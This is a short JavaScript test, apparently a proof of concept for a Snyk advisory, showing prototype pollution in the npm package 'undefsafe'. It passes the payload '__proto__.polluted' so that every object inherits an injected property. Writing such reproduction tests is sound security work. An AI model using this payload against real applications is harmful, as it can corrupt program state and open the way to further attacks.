//https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940
test("prototype pollution in undefsafe ", () => {
    
    var a = require("undefsafe");
    var obj = {}

    expect({}.polluted).toBe(undefined);
    

    var payload = "__proto__.polluted";
    a({},payload,"yes");

    expect(obj.polluted).toBe("yes");
  });